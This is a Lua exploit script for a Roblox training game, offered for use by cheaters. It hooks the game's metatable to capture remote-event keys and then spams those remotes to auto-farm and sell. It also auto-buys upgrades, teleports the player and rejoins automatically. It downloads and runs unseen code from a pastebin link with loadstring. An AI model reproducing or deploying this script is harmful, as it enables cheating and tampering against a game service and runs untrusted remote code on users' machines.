--[[
	Script: Megumu/Mommy Mango
	Auto-Rejoin: Pepsi
	<3
]]

--Settings
_G.Enabled = true; --Toggle On/Off
_G.Settings = {
    AutoWeight = true; --Automatically buys better weights
    AutoGene = false; --Automatically buys better genes
	OPFarm = true; --Spams the remote & automatically sells; Paid exploit required
	RandomTP = true; --Teleport to a random position
}

--Loading
repeat player = game.Players.LocalPlayer wait(0.25) until player and player:FindFirstChild("Backpack") and #player.Backpack:GetChildren() == 3 and player.Character and player.Character:FindFirstChild("Humanoid") and player.Character:FindFirstChild("HumanoidRootPart")
print("Loaded!")

--Variable
local player = game.Players.LocalPlayer
local hum = player.Character.Humanoid
local mt = getrawmetatable(game)
make_writeable(mt)

--Keys
Key1 = "fill"
Key2 = "fill"
SellKey = "fill"

--Credits
loadstring(game:HttpGet("https://pastebin.com/raw/vJg6Sa8w", true))()

--Auto Rejoin | LOVE YOU PEPSI
local prompt = assert(game:GetService("CoreGui"):FindFirstChild("promptOverlay", true), "Looks like this method is patched. :/")
assert(not prompt:FindFirstChild("ErrorPrompt"), prompt:FindFirstChild("ErrorPrompt") and wait(2) and game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer))
prompt.ChildAdded:Connect(function(child)
    assert(child, typeof(child) == "Instance" and child.Name == "ErrorPrompt" and child.ClassName == "Frame" and wait(2) and game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer))
end)

--OP Farm
if _G.Settings["OPFarm"] then
	--Log Key
	local old = mt.__namecall
	mt.__namecall = newcclosure(loadstring([[
		local old = ...
		return function(self, ...)
			local len = select("#", ...)
			local pack = {...}
			local args = {}
			for i=1,len do
				args[i] = pack[i]
			end

			local method = getnamecallmethod()
			if method == "FireServer" and tostring(self) == "RemoteEvent" then
				if #args == 2 then
					Key1 = args[1]
					Key2 = args[2]
				elseif #args == 1 then
					SellKey = args[1]
				end
			end
			return old(self, ...)
		end
	]])(old))

	--Get Remote Key
	for i, v in pairs(player.Backpack:GetChildren()) do
		if v.Name ~= "Fist" and v.Name ~= "Foot" then
			hum:EquipTool(v)
			repeat wait() until v.Parent == player.Character
			repeat
				player.Character.HumanoidRootPart.Position = workspace.Mark01.Detector.Position
				wait()
				v:Activate()
			until Key1 ~= "fill" and Key2 ~= "fill" and SellKey ~= "fill"
		end
	end
end

--Platform
if _G.Settings["RandomTP"] then
	local plat = Instance.new("Part", workspace)
	plat.Size = Vector3.new(math.huge, 10, math.huge)
	plat.Anchored = true
	plat.CanCollide = true
	plat.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(200, 3000), math.random(300, 3000), math.random(200, 3000))
	wait()
	player.Character.HumanoidRootPart.Position = Vector3.new(0, 100, 0)	
end

--Equip
function equip()
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        if player.Character:FindFirstChildOfClass("Tool") then
            return true
        elseif player:FindFirstChild("Backpack") and #player.Backpack:GetChildren() == 3 then
            for i, v in pairs(player.Backpack:GetChildren()) do
                if v.Name ~= "Fist" and v.Name ~= "Foot" then
                    hum:EquipTool(v)
                    repeat wait() until v.Parent == player.Character
                    return true
                end
            end
        else
            return false
        end
    else
        return false
    end
end

--AutoBuy
local function buy(page)
    for i, v in pairs(player.PlayerGui.ModalGui.Buy.PageFrame.PageList[page]:GetChildren()) do
        if v:FindFirstChild("tlPrice") and v.tlPrice.Text ~= "Owned" and v.tlPrice.Text ~= "Equipped" and not v:FindFirstChild("VipTxt") then
            game.ReplicatedStorage.RemoteFunction:InvokeServer("ItemBuy", v.Name)
            wait()
        end
    end
end

--Farm
spawn(function()
	while _G.Enabled do
		if _G.Settings["OPFarm"] == false then
			if equip() then 
				player.Character:FindFirstChildOfClass("Tool"):Activate()
			end
		else
			if equip() then
				game.ReplicatedStorage.RemoteEvent:FireServer(Key1, Key2)
				game.ReplicatedStorage.RemoteEvent:FireServer(SellKey)
			end
		end
		wait()
	end
end)

--Start
spawn(function()
    while _G.Enabled do   
        if _G.Settings["AutoWeight"] then
            buy("Page01")
        end
        if _G.Settings["AutoGene"] then
            buy("Page02")
        end
		wait()
    end
end)